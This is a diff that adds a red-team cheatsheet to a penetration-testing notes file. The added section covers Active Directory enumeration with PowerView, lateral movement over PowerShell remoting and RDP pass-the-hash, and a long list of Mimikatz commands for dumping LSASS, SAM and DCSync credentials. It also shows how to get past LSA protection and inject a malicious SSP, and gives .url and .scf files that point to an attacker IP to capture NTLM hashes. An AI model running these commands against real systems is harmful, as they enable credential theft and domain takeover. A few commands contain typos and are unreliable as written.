@@ -2712,6 +2712,395 @@ If using custom TLS cert on the C2 via malleable profile (or importing a valid c
 openssl s_client -connect <IP>:443 -servername fluxmalware.com -showcerts </dev/null 2>/tmp/openssl_out.txt
 ```
 
+---
+
+## Kali Cheatsheet
+
+<a name="KALI"></a>
+
+### Domain Recon
+
+#### PowerView
+
+```shell
+# Import powerview
+pwsh -NoExit -Command "Import-Module /tmp/PowerView.ps1 -Force"
+```
+
+- **Get Current Domain**: Get-Domain
+
+- **Enumerate Other Domains**: Get-Domain -Domain <DomainName>
+
+- **Get Domain SID**: Get-DomainSID
+
+- **Get Domain Policy**:
+
+```powershell
+Get-DomainPolicy
+
+# Will show us the policy configurations of the Domain about system access or kerberos
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
+```
+
+- Get Domain Controllers:
+
+```powershell
+Get-DomainController
+Get-DomainController -Domain <DomainName>
+```
+
+- **Enumerate Domain Users**:
+
+```powershell
+# Save all Domain Users to a file
+Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
+
+# Will return specific properties of a specific user
+Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
+
+# Enumerate user logged on a machine
+Get-NetLoggedon -ComputerName <ComputerName>
+
+# Enumerate Session Information for a machine
+Get-NetSession -ComputerName <ComputerName>
+
+# Enumerate domain machines of the current/specified domain where specific users are logged into
+Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+```
+
+- Enum Domain Computers:
+
+```powershell
+Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+
+#Enumerate Live machines
+Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+```
+
+- **Enum Groups and Group Members:**
+
+  ```powershell
+  #Save all Domain Groups to a file:
+  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
+
+  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
+  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
+  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
+
+  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
+  Get-NetLocalGroup | Select-Object GroupName
+
+  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
+  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
+
+  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
+  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+  ```
+
+- **Enumerate Shares:**
+
+  ```powershell
+  #Enumerate Domain Shares
+  Find-DomainShare
+
+  #Enumerate Domain Shares the current user has access
+  Find-DomainShare -CheckShareAccess
+
+  #Enumerate "Interesting" Files on accessible shares
+  Find-InterestingDomainShareFile -Include *passwords*
+  ```
+
+- **Enum Group Policies:**
+
+  ```powershell
+  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
+
+  #Enumerate all GPOs to a specific computer
+  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
+
+  #Get users that are part of a Machine's local Admin group
+  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
+  ```
+
+- **Enum OUs:**
+  ```powershell
+  Get-DomainOU -Properties Name | Sort-Object -Property Name
+  ```
+- **Enum ACLs:**
+
+  ```powershell
+  # Returns the ACLs associated with the specified account
+  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
+
+  #Search for interesting ACEs
+  Find-InterestingDomainAcl -ResolveGUIDs
+
+  #Check the ACLs associated with a specified path (e.g smb share)
+  Get-PathAcl -Path "\\Path\Of\A\Share"
+  ```
+
+- **Enum Domain Trust:**
+
+  ```powershell
+  Get-DomainTrust
+  Get-DomainTrust -Domain <DomainName>
+
+  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
+  Get-DomainTrustMapping
+  ```
+
+- **Enum Forest Trust:**
+
+  ```powershell
+  Get-ForestDomain
+  Get-ForestDomain -Forest <ForestName>
+
+  #Map the Trust of the Forest
+  Get-ForestTrust
+  Get-ForestTrust -Forest <ForestName>
+  ```
+
+- **User Hunting:**
+
+  ```powershell
+  #Finds all machines on the current domain where the current user has local admin access
+  Find-LocalAdminAccess -Verbose
+
+  #Find local admins on all machines of the domain
+  Find-DomainLocalGroupMember -Verbose
+
+  #Find computers were a Domain Admin OR a specified user has a session
+  Find-DomainUserLocation | Select-Object UserName, SessionFromName
+
+  #Confirming admin access
+  Test-AdminAccess
+  ```
+
+  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
+  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!
+
+### Lateral Movement
+
+#### PowerShell Remoting
+
+```powershell
+#Enable PowerShell Remoting on current Machine (Needs Admin Access)
+Enable-PSRemoting
+
+#Entering or Starting a new PSSession (Needs Admin Access)
+$sess = New-PSSession -ComputerName <Name>
+Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
+```
+
+#### Remote Code Execution with PS Credentials
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
+Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
+```
+
+#### Import a PowerShell Module and Execute its Functions Remotely
+
+```powershell
+#Execute the command and start a session
+Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
+
+#Interact with the session
+Enter-PSSession -Session $sess
+
+```
+
+#### Executing Remote Stateful commands
+
+```powershell
+#Create a new session
+$sess = New-PSSession -ComputerName <NameOfComputer>
+
+#Execute command on the session
+Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
+
+#Check the result of the command to confirm we have an interactive session
+Invoke-Command -Session $sess -ScriptBlock {$ps}
+```
+
+#### Mimikatz
+
+```powershell
+#The commands are in cobalt strike format!
+
+#Dump LSASS:
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords
+
+#(Over) Pass The Hash
+mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+
+#List all available kerberos tickets in memory
+mimikatz sekurlsa::tickets
+
+#Dump local Terminal Services credentials
+mimikatz sekurlsa::tspkg
+
+#Dump and save LSASS in a file
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+
+#List cached MasterKeys
+mimikatz sekurlsa::dpapi
+
+#List local Kerberos AES Keys
+mimikatz sekurlsa::ekeys
+
+#Dump SAM Database
+mimikatz lsadump::sam
+
+#Dump SECRETS Database
+mimikatz lsadump::secrets
+
+#Inject and dump the Domain Controler's Credentials
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject
+
+#Dump the Domain's Credentials without touching DC's LSASS and also remotely
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+
+#Dump old passwords and NTLM hashes of a user
+mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
+
+#List and Dump local kerberos credentials
+mimikatz kerberos::list /dump
+
+#Pass The Ticket
+mimikatz kerberos::ptt <PathToKirbiFile>
+
+#List TS/RDP sessions
+mimikatz ts::sessions
+
+#List Vault credentials
+mimikatz vault::list
+```
+
+:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?
+
+- LSA as a Protected Process (Kernel Land Bypass)
+
+  ```powershell
+  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+  #Now lets import the mimidriver.sys to the system
+  mimikatz # !+
+
+  #Now lets remove the protection flags from lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe /remove
+
+  #Finally run the logonpasswords function to dump lsass
+  mimikatz # sekurlsa::logonpasswords
+  ```
+
+- LSA as a Protected Process (Userland "Fileless" Bypass)
+
+  - [PPLdump](https://github.com/itm4n/PPLdump)
+  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
+
+- LSA is running as virtualized process (LSAISO) by Credential Guard
+
+  ```powershell
+  #Check if a process called lsaiso.exe exists on the running processes
+  tasklist |findstr lsaiso
+
+  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
+  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  mimikatz # misc::memssp
+
+  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+  ```
+
+- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
+- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
+
+#### Remote Desktop Protocol
+
+If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.
+
+- Mimikatz:
+
+  ```powershell
+  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
+  privilege::debug
+  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
+
+  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
+  ```
+
+- xFreeRDP:
+
+```powershell
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
+```
+
+:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
+
+- Bypass "Single Session per User" Restriction
+
+On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
+```powershell
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
+```
+
+Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
+```powershell
+REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
+```
+
+#### URL File Attacks
+
+- .url file
+
+  ```
+  [InternetShortcut]
+  URL=whatever
+  WorkingDirectory=whatever
+  IconFile=\\<AttackersIp>\%USERNAME%.icon
+  IconIndex=1
+  ```
+
+  ```
+  [InternetShortcut]
+  URL=file://<AttackersIp>/leak/leak.html
+  ```
+
+- .scf file
+
+  ```
+  [Shell]
+  Command=2
+  IconFile=\\<AttackersIp>\Share\test.ico
+  [Taskbar]
+  Command=ToggleDesktop
+  ```
+
+Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.
+
+:exclamation: .scf file attacks won't work on the latest versions of Windows.
+
+### Useful Tools
+
+- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward
+  capabilities.
+- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
+- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
+- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
+- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks
+
+---
+
+
 ## Reference:
 
 [https://training.zeropointsecurity.co.uk/courses/red-team-ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
